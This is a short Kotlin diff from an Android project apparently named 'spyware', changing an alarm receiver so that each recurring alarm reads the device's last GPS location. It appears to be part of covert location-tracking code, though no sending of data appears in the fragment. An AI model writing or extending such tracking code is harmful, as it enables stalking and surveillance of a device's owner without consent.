@@ -6,9 +6,12 @@ import android.content.Intent
 import com.example.spyware.common.Constants.Companion.timerSeconds
 
 class AlarmReceiver: BroadcastReceiver() {
+    private lateinit var gpsReader: GpsReader;
 
     override fun onReceive(context: Context, intent: Intent?) {
         AlarmManger(context).start(System.currentTimeMillis()+ timerSeconds *1000)
-        TimeoutHandler(context).alarm()
+        gpsReader=GpsReader(context)
+        gpsReader.getLastLocation()
+
     }
 }
